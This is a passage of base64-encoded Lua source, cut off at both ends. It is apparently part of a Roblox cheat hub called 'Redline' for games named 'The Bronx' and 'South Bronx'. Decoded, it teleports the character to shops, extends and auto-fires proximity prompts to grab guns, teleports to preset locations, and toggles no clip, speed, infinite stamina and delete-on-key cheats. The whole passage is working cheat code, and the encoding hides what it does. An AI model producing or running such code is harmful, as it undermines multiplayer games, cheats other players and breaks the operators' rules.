CAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMykKCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEl0ZW1SZWNlaWV2ZWQgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBDaGVjayA9IExvY2FsUGxheWVyLkJhY2twYWNrLkNoaWxkQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihDaGlsZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b3N0cmluZyhDaGlsZCkgPT0gdG9zdHJpbmcoc2VsZikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJdGVtUmVjZWlldmVkID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxLjUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSXRlbVJlY2VpZXZlZCA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgdGFzay53YWl0KCkgdW50aWwgSXRlbVJlY2VpZXZlZCA9PSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBDaGVjazpEaXNjb25uZWN0KCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0IHRhc2sud2FpdCgpOyBmaXJlcHJveGltaXR5cHJvbXB0KFByb21wdCk7IHVudGlsIEl0ZW1SZWNlaWV2ZWQgPT0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMykKCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oVGVsZXBvcnQsIE9sZENGcmFtZSkKCiAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSAiUmVkbGluZSIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmZvID0gYFN1Y2Nlc3NmdWxseSBwdXJjaGFzZWQge3NlbGZ9IWAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaWZldGltZSA9IDUKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICBlbmQpKQogICAgICAgICAgICAgICAgZW5kfSldXQoKICAgICAgICAgICAgICAgIC0tbmV3IGl0ZW0gYnV5CldlYXBvbkxpc3RTZWN0aW9uOmxpc3QoewogICAgZmxhZyA9ICJQdXJjaGFzZVNlbGVjdGVkSXRlbV9UaGVCcm9ueCIsCiAgICBvcHRpb25zID0gQ29uZmlnLkd1bnMsCiAgICBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQoKICAgICAgICAgICAgaWYgbm90IHN0YXRlIHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICAgICAgbG9jYWwgaXRlbSA9IHN0cmluZy5tYXRjaChzdGF0ZSwgIl4oLiopICUtIikKICAgICAgICAgICAgaWYgbm90IGl0ZW0gdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIGl0ZW0gPSBpdGVtOm1hdGNoKCJeJXMqKC4tKSVzKiQiKQoKICAgICAgICAgICAgbG9jYWwgZ3VuRm9sZGVyID0gV29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCJHVU5TIikKICAgICAgICAgICAgaWYgbm90IGd1bkZvbGRlciB0aGVuIHJldHVybiBlbmQKCiAgICAgICAgICAgIGxvY2FsIGd1biA9IGd1bkZvbGRlcjpGaW5kRmlyc3RDaGlsZChpdGVtKQogICAgICAgICAgICBpZiBub3QgZ3VuIHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICAgICAgbG9jYWwgcHJvbXB0ID0gZ3VuOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIlByb3hpbWl0eVByb21wdCIsIHRydWUpCiAgICAgICAgICAgIGxvY2FsIHByaWNlID0gZ3VuOkZpbmRGaXJzdENoaWxkKCJQcmljZSIsIHRydWUpCiAgICAgICAgICAgIGxvY2FsIGdhbWVwYXNzID0gZ3VuOkZpbmRGaXJzdENoaWxkKCJHYW1lcGFzc0lEIiwgdHJ1ZSkKCiAgICAgICAgICAgIGlmIG5vdCBwcm9tcHQgb3Igbm90IHByaWNlIHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICAgICAgbG9jYWwgSFJQID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQKICAgICAgICAgICAgbG9jYWwgb2xkQ0YgPSBIUlAuQ0ZyYW1lCgogICAgICAgICAgICBpZiBnYW1lcGFzcyB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBpZCA9IGdhbWVwYXNzLlZhbHVlCiAgICAgICAgICAgICAgICBpZiBub3QgTWFya2V0cGxhY2VTZXJ2aWNlOlVzZXJPd25zR2FtZVBhc3NBc3luYyhMb2NhbFBsYXllci5Vc2VySWQsIGlkKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgICAgICAgICAgbmFtZSA9ICJSZWRsaW5lIiwKICAgICAgICAgICAgICAgICAgICAgICAgaW5mbyA9ICJZb3UgZG8gbm90IG93biB0aGUgZ2FtZXBhc3MhIiwKICAgICAgICAgICAgICAgICAgICAgICAgbGlmZXRpbWUgPSA0CiAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGlmIExvY2FsUGxheWVyLnN0b3JlZC5Nb25leS5WYWx1ZSA8IHByaWNlLlZhbHVlIHRoZW4KICAgICAgICAgICAgICAgIHJldHVybiBsaWJyYXJ5Lm5vdGlmaWNhdGlvbnM6Y3JlYXRlX25vdGlmaWNhdGlvbih7CiAgICAgICAgICAgICAgICAgICAgbmFtZSA9ICJSZWRsaW5lIiwKICAgICAgICAgICAgICAgICAgICBpbmZvID0gYFlvdSBhcmUge3ByaWNlLlZhbHVlIC0gTG9jYWxQbGF5ZXIuc3RvcmVkLk1vbmV5LlZhbHVlfSBzaG9ydC5gLAogICAgICAgICAgICAgICAgICAgIGxpZmV0aW1lID0gNAogICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBsb2NhbCBwYXJ0ID0gcHJvbXB0LlBhcmVudC5DRnJhbWUgb3IgZ3VuLlByaW1hcnlQYXJ0LkNGcmFtZQogICAgICAgICAgICBIUlAuQ0ZyYW1lID0gcGFydAogICAgICAgICAgICB0YXNrLndhaXQoMC4wNSkKCiAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHByb21wdC5NYXhBY3RpdmF0aW9uRGlzdGFuY2UgPSAyNQogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBwcm9tcHQuUGFyZW50LkNGcmFtZSA9IEhSUC5DRnJhbWUKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgdGFzay53YWl0KDAuMDUpCgogICAgICAgICAgICBmb3IgaSA9IDEsIDMgZG8KICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBmaXJlcHJveGltaXR5cHJvbXB0KHByb21wdCwgMSkKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgSFJQLkNGcmFtZSA9IG9sZENGCgogICAgICAgICAgICBsaWJyYXJ5Lm5vdGlmaWNhdGlvbnM6Y3JlYXRlX25vdGlmaWNhdGlvbih7CiAgICAgICAgICAgICAgICBuYW1lID0gIlJlZGxpbmUiLAogICAgICAgICAgICAgICAgaW5mbyA9IGBQdXJjaGFzZWQge2l0ZW19IWAsCiAgICAgICAgICAgICAgICBsaWZldGltZSA9IDQKICAgICAgICAgICAgfSkKCiAgICAgICAgZW5kKQogICAgZW5kCn0pCgoKICAgICAgICAgICAgICAgIGxvY2FsIHF1aWNrYnV5c2VjID0gUHVyY2hhc2VHdW5Db2x1bW46c2VjdGlvbih7bmFtZSA9ICJRdWljayBCdXkiLCBzaWRlID0gImxlZnQiLCBzaXplID0gMC40NTAsIGljb24gPSBHZXRJbWFnZSgiQ2FzaC5wbmciKX0pCgpsb2NhbCBSZXBsaWNhdGVkU3RvcmFnZSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKQpsb2NhbCBXb3Jrc3BhY2UgPSBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpCmxvY2FsIExvY2FsUGxheWVyID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIKbG9jYWwgTWFya2V0cGxhY2VTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJNYXJrZXRwbGFjZVNlcnZpY2UiKQoKbG9jYWwgR3Vuc0ZvbGRlciA9IFdvcmtzcGFjZTpXYWl0Rm9yQ2hpbGQoIkdVTlMiKQoKbG9jYWwgU2hvcFJlbW90ZTIgPSBSZXBsaWNhdGVkU3RvcmFnZTpXYWl0Rm9yQ2hpbGQoIlNob3BSZW1vdGUyIikKbG9jYWwgRXhvdGljU2hvcFJlbW90ZSA9IFJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiRXhvdGljU2hvcFJlbW90ZSIpCgpsb2NhbCBHdW5zVG9CdXkgPSB7IkRyYWNvIiwgIkJhZ0VsaXRlIn0KCmxvY2FsIGZ1bmN0aW9uIFNtYXJ0VFAoY2YpCiAgICBsb2NhbCBIUlAgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICBpZiBIUlAgdGhlbgogICAgICAgIEhSUC5DRnJhbWUgPSBjZgogICAgZW5kCmVuZAoKZm9yIF8sIGd1bk5hbWUgaW4gaXBhaXJzKEd1bnNUb0J1eSkgZG8KICAgIHF1aWNrYnV5c2VjOmJ1dHRvbih7CiAgICAgICAgbmFtZSA9IGd1bk5hbWUsCiAgICAgICAgY2FsbGJhY2sgPSBmdW5jdGlvbigpCgogICAgICAgICAgICBsb2NhbCBndW4gPSBHdW5zRm9sZGVyOkZpbmRGaXJzdENoaWxkKGd1bk5hbWUpCiAgICAgICAgICAgIGlmIG5vdCBndW4gdGhlbgogICAgICAgICAgICAgICAgcmV0dXJuIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgICAgICBuYW1lID0gIlJlZGxpbmUiLAogICAgICAgICAgICAgICAgICAgIGluZm8gPSBndW5OYW1lIC4uICIgbm90IGZvdW5kISIsCiAgICAgICAgICAgICAgICAgICAgbGlmZXRpbWUgPSA1CiAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGxvY2FsIFByb21wdCA9IGd1bjpGaW5kRmlyc3RDaGlsZFdoaWNoSXNBKCJQcm94aW1pdHlQcm9tcHQiLCB0cnVlKQogICAgICAgICAgICBpZiBub3QgUHJvbXB0IHRoZW4KICAgICAgICAgICAgICAgIHJldHVybiBsaWJyYXJ5Lm5vdGlmaWNhdGlvbnM6Y3JlYXRlX25vdGlmaWNhdGlvbih7CiAgICAgICAgICAgICAgICAgICAgbmFtZSA9ICJSZWRsaW5lIiwKICAgICAgICAgICAgICAgICAgICBpbmZvID0gIlByb21wdCBub3QgZm91bmQhIiwKICAgICAgICAgICAgICAgICAgICBsaWZldGltZSA9IDUKICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgaWYgZ3VuOkZpbmRGaXJzdENoaWxkKCJQcmljZSIpIHRoZW4KICAgICAgICAgICAgICAgIGlmIExvY2FsUGxheWVyLnN0b3JlZC5Nb25leS5WYWx1ZSA8IGd1bi5QcmljZS5WYWx1ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgICAgICAgICAgbmFtZSA9ICJSZWRsaW5lIiwKICAgICAgICAgICAgICAgICAgICAgICAgaW5mbyA9IGBZb3UgYXJlIHtndW4uUHJpY2UuVmFsdWUgLSBMb2NhbFBsYXllci5zdG9yZWQuTW9uZXkuVmFsdWV9IHNob3J0LmAsCiAgICAgICAgICAgICAgICAgICAgICAgIGxpZmV0aW1lID0gNQogICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBsb2NhbCBIUlAgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydAogICAgICAgICAgICBsb2NhbCBPbGRDRnJhbWUgPSBIUlAuQ0ZyYW1lCgogICAgICAgICAgICBsb2NhbCBCdXlQb3MgPSAoUHJvbXB0LlBhcmVudDpJc0EoIkJhc2VQYXJ0IikgYW5kIFByb21wdC5QYXJlbnQuQ0ZyYW1lKSAKICAgICAgICAgICAgICAgIG9yIChndW4uUHJpbWFyeVBhcnQgYW5kIGd1bi5QcmltYXJ5UGFydC5DRnJhbWUpIAogICAgICAgICAgICAgICAgb3IgT2xkQ0ZyYW1lCgogICAgICAgICAgICBTbWFydFRQKEJ1eVBvcykKICAgICAgICAgICAgdGFzay53YWl0KDAuMDUpCgogICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBQcm9tcHQuTWF4QWN0aXZhdGlvbkRpc3RhbmNlID0gMjUKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKCiAgICAgICAgICAgIGxvY2FsIGdvdEl0ZW0gPSBmYWxzZQoKICAgICAgICAgICAgbG9jYWwgY2hlY2sgPSBMb2NhbFBsYXllci5CYWNrcGFjay5DaGlsZEFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oY2hpbGQpCiAgICAgICAgICAgICAgICBpZiBjaGlsZC5OYW1lID09IGd1bk5hbWUgdGhlbgogICAgICAgICAgICAgICAgICAgIGdvdEl0ZW0gPSB0cnVlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgdGFzay5kZWxheSgxLjIsIGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGdvdEl0ZW0gPSB0cnVlCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIHJlcGVhdAogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDIpCiAgICAgICAgICAgICAgICBmaXJlcHJveGltaXR5cHJvbXB0KFByb21wdCwgMSkKICAgICAgICAgICAgdW50aWwgZ290SXRlbQoKICAgICAgICAgICAgY2hlY2s6RGlzY29ubmVjdCgpCgogICAgICAgICAgICBTbWFydFRQKE9sZENGcmFtZSkKCiAgICAgICAgICAgIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgIG5hbWUgPSAiUmVkbGluZSIsCiAgICAgICAgICAgICAgICBpbmZvID0gZ3VuTmFtZSAuLiAiIFB1cmNoYXNlZCEiLAogICAgICAgICAgICAgICAgbGlmZXRpbWUgPSA1CiAgICAgICAgICAgIH0pCiAgICAgICAgZW5kCiAgICB9KQplbmQKCnF1aWNrYnV5c2VjOmJ1dHRvbih7CiAgICBuYW1lID0gIkJhbmRhZ2UiLAogICAgY2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgU2hvcFJlbW90ZTI6SW52b2tlU2VydmVyKCJCYW5kYWdlIikKICAgICAgICBsaWJyYXJ5Lm5vdGlmaWNhdGlvbnM6Y3JlYXRlX25vdGlmaWNhdGlvbih7CiAgICAgICAgICAgIG5hbWUgPSAiUmVkbGluZSIsCiAgICAgICAgICAgIGluZm8gPSAiQmFuZGFnZSBQdXJjaGFzZWQhIiwKICAgICAgICAgICAgbGlmZXRpbWUgPSA1CiAgICAgICAgfSkKICAgIGVuZAp9KQoKcXVpY2tidXlzZWM6YnV0dG9uKHsKICAgIG5hbWUgPSAiTGVtb25hZGUiLAogICAgY2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgRXhvdGljU2hvcFJlbW90ZTpJbnZva2VTZXJ2ZXIoIkxlbW9uYWRlIikgCiAgICAgICAgbGlicmFyeS5ub3RpZmljYXRpb25zOmNyZWF0ZV9ub3RpZmljYXRpb24oewogICAgICAgICAgICBuYW1lID0gIlJlZGxpbmUiLAogICAgICAgICAgICBpbmZvID0gIkxlbW9uYWRlIFB1cmNoYXNlZCEiLAogICAgICAgICAgICBsaWZldGltZSA9IDUKICAgICAgICB9KQogICAgZW5kCn0pCgoKICAgICAgICAgICAgICAgIFB1cmNoYXNlR3VuQ29sdW1uID0gUHVyY2hhc2VHdW5UYWI6Y29sdW1uKHt9KQoKICAgICAgICAgICAgICAgIGxvY2FsIFRlbGVwb3J0TGlzdFNlY3Rpb24gPSBQdXJjaGFzZUd1bkNvbHVtbjpzZWN0aW9uKHtuYW1lID0gIlRlbGVwb3J0IFRvIExvY2F0aW9uIiwgc2lkZSA9ICJyaWdodCIsIHNpemUgPSAxLCBpY29uID0gR2V0SW1hZ2UoIldvcmxkLnBuZyIpfSkKCiAgICAgICAgICAgICAgICBsb2NhbCBMaXN0ID0ge30KCiAgICAgICAgICAgICAgICBmb3IgSW5kZXgsIFZhbHVlIGluIENvbmZpZy5UaGVCcm9ueC5UZWxlcG9ydGF0aW9uTGlzdCBkbwogICAgICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChMaXN0LCBJbmRleCkKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIHRhYmxlLnNvcnQoTGlzdCkKCiAgICAgICAgICAgICAgICBUZWxlcG9ydExpc3RTZWN0aW9uOmxpc3Qoe2ZsYWcgPSAiVGVsZXBvcnRUb1BsYWNlX1RoZUJyb254Iiwgb3B0aW9ucyA9IExpc3QsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgdGFzay5zcGF3bihMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBzdGF0ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICBUZWxlcG9ydChDb25maWcuVGhlQnJvbnguVGVsZXBvcnRhdGlvbkxpc3Rbc3RhdGVdKQoKICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeS5ub3RpZmljYXRpb25zOmNyZWF0ZV9ub3RpZmljYXRpb24oewogICAgICAgICAgICAgICAgICAgICAgICAgICAgbmFtZSA9ICJSZWRsaW5lIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluZm8gPSBgU3VjY2Vzc2Z1bGx5IHRlbGVwb3J0ZWQgdG8ge3N0YXRlfSFgLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlmZXRpbWUgPSA1CiAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgZW5kKSkKICAgICAgICAgICAgICAgIGVuZH0pCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCmVuZAoKaWYgR2FtZV9OYW1lID09ICJTb3V0aCBCcm9ueCIgdGhlbgogICAgd2luZG93OnNlcGVyYXRvcih7bmFtZSA9ICIifSkgZG8KICAgICAgICBsb2NhbCBMb2NhbFBsYXllclRhYiwgUGxheWVyc1RhYiwgUHVyY2hhc2VHdW5UYWIgPSB3aW5kb3c6dGFiKHtuYW1lID0gIk1haW4iLCB0YWJzID0geyJMb2NhbCBQbGF5ZXIiLCAiUGxheWVycyIsICJUZWxlcG9ydHMifSwgaWNvbiA9IEdldEltYWdlKCJXb3JsZC5wbmciKX0pIGRvCiAgICAgICAgICAgIGRvIC0tIFxcIExvY2FsIFBsYXllcgogICAgICAgICAgICAgICAgbG9jYWwgTG9jYWxQbGF5ZXJDb2x1bW4gPSBMb2NhbFBsYXllclRhYjpjb2x1bW4oe30pCiAgICAgICAgICAgICAgICBsb2NhbCBMb2NhbFBsYXllck1vZHNTZWN0aW9uID0gTG9jYWxQbGF5ZXJDb2x1bW46c2VjdGlvbih7bmFtZSA9ICJMb2NhbCBQbGF5ZXIgTW9kaWZpY2F0aW9ucyIsIHNpZGUgPSAibGVmdCIsIHNpemUgPSAwLjQ3NX0pCgogICAgICAgICAgICAgICAgbG9jYWwgX19Nb2RpZmljYXRpb25zID0gewogICAgICAgICAgICAgICAgICAgICJJbmZpbml0ZSBTdGFtaW5hIjsKICAgICAgICAgICAgICAgICAgICAiSW5zdGFudCBJbnRlcmFjdCI7CiAgICAgICAgICAgICAgICAgICAgIkRlbGV0ZSBPbiBLZXkiOwogICAgICAgICAgICAgICAgICAgICJIaWRlIE5hbWUiOwogICAgICAgICAgICAgICAgICAgICJObyBDbGlwIjsKICAgICAgICAgICAgICAgICAgICAiU3BlZWQiOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZvciBfLCBJbmRleCBpbiBfX01vZGlmaWNhdGlvbnMgZG8KICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllck1vZHNTZWN0aW9uOnRvZ2dsZSh7dHlwZSA9ICJ0b2dnbGUiLCBuYW1lID0gSW5kZXgsIGZsYWcgPSBJbmRleC4uIl9TQiIsIGRlZmF1bHQgPSBmYWxzZSwgY2FsbGJhY2sgPSBJbmRleCB+PSAiTm8gQ2xpcCIgYW5kIExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKFZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSW5kZXggPSBzdHJpbmcuZ3N1YihJbmRleCwgIiAiLCAiIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbmZpZy5Tb3V0aF9Ccm9ueC5Mb2NhbFBsYXllcl9Db25maWdbSW5kZXhdID0gVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgZW5kKSBvciBmdW5jdGlvbihWYWx1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIFZhbHVlIGFuZCBub3QgU29sYXJhIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSdW5TZXJ2aWNlOkJpbmRUb1JlbmRlclN0ZXAoIk5PQ0xJUCIsIDEsIExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLkhlYWx0aCB+PSAwIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgSW5kZXgsIFZhbHVlIGluIExvY2FsUGxheWVyLkNoYXJhY3RlcjpHZXREZXNjZW5kYW50cygpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbGxpZGVfRGF0YVtWYWx1ZS5OYW1lXSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmFsdWUuQ2FuQ29sbGlkZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkdldERlc2NlbmRhbnRzKCkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgQ29sbGlkZV9EYXRhW1ZhbHVlLk5hbWVdIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBWYWx1ZS5DYW5Db2xsaWRlID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJ1blNlcnZpY2U6VW5iaW5kRnJvbVJlbmRlclN0ZXAoIk5PQ0xJUCIpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgSW5kZXgsIFZhbHVlIGluIExvY2FsUGxheWVyLkNoYXJhY3RlcjpHZXREZXNjZW5kYW50cygpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbGxpZGVfRGF0YVtWYWx1ZS5OYW1lXSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmFsdWUuQ2FuQ29sbGlkZSA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmR9KQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXJNb2RzU2VjdGlvbiA9IExvY2FsUGxheWVyQ29sdW1uOnNlY3Rpb24oe25hbWUgPSAiTW9kaWZpY2F0aW9uIFNldHRpbmdzIiwgc2lkZSA9ICJsZWZ0Iiwgc2l6ZSA9IDAuMjc1LCBpY29uID0gR2V0SW1hZ2UoIlNldHRpbmdzLnBuZyIpfSkKCiAgICAgICAgICAgICAgICBMb2NhbFBsYXllck1vZHNTZWN0aW9uOnNsaWRlcih7bmFtZSA9ICJXYWxrU3BlZWQgVmFsdWUiLCBmbGFnID0gIldhbGtTcGVlZFZhbHVlX1NvdXRoQnJvbngiLCBtaW4gPSAwLCBtYXggPSA1MCwgZGVmYXVsdCA9IDI1LCBzdWZmaXggPSAiJSIsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlNvdXRoX0Jyb254LkxvY2FsUGxheWVyX0NvbmZpZy5TcGVlZFZhbHVlID0gc3RhdGUvMTAwCiAgICAgICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgICAgIExvY2FsUGxheWVyTW9kc1NlY3Rpb246a2V5YmluZCh7bmFtZSA9ICJEZWxldGUgKyBDbGljayBLZXkiLCBmbGFnID0gIkRlbGV0ZU9uS2V5X1NvdXRoQnJvbngiLCBrZXkgPSBFbnVtLktleUNvZGUuTGVmdENvbnRyb2wsIG1vZGUgPSAiSG9sZCIsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgQ29u